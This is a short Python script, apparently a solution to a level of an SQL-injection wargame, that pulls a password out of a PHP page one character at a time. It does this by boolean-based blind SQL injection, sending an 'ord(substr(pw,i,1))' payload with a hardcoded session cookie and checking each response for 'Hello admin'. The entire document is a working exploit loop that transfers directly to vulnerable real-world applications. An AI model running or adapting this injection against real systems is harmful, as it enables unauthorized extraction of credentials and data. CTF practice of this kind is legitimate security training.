import requests

cookie = {'PHPSESSID': 'oun52stc0c0holtrige3ndhkc7'}
url = "https://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw="
cmp = "Hello admin"
name=''

lost=''
for i in range(1, 41):
    for j in range(100, 500):
    	query = url + " 0'|| ord(substr(pw," + str(i) + ",1))="+str(j)+" -- -"
    	print(query)
    	req = requests.get(query, cookies=cookie)
    	res=req.text
    	if cmp in res:
    		str1 = str(j)+"  "
    		name += str1
    		print(name)
    		break
print ("0x"+name)
